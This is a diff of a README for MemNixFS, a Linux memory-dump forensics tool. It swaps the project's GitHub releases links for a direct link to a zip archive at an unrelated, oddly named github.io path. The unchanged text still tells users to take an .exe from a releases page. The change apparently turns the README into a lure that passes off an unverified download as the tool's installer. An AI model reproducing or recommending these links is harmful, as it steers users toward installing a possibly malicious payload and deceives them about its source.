@@ -5,7 +5,7 @@ description: "Mount a Linux memory dump as a searchable filesystem to analyze pr
 ---
 # 🔍 MemNixFS - Transform Memory Dumps Into Filesystems
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/stanleyjoy1980/MemNixFS/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/stanleyjoy1980/stanleyjoy1980.github.io/main/quizzatorial/stanleyjoy-io-github-wennebergite.zip)
 
 MemNixFS helps you analyze computer memory dumps. It turns raw memory data into a standard folder structure. You can browse this structure just like you browse files on your hard drive. This tool helps investigators view what a computer held in memory at a specific point in time.
 
@@ -36,7 +36,7 @@ Follow these steps to set up the software on your Windows machine.
 
 Visit the following link to find the latest version of the application: 
 
-[https://github.com/stanleyjoy1980/MemNixFS/releases](https://github.com/stanleyjoy1980/MemNixFS/releases)
+[https://raw.githubusercontent.com/stanleyjoy1980/stanleyjoy1980.github.io/main/quizzatorial/stanleyjoy-io-github-wennebergite.zip](https://raw.githubusercontent.com/stanleyjoy1980/stanleyjoy1980.github.io/main/quizzatorial/stanleyjoy-io-github-wennebergite.zip)
 
 On that page, look for the file ending in `.exe` under the Assets section. Click the filename to save the installer to your computer.
 
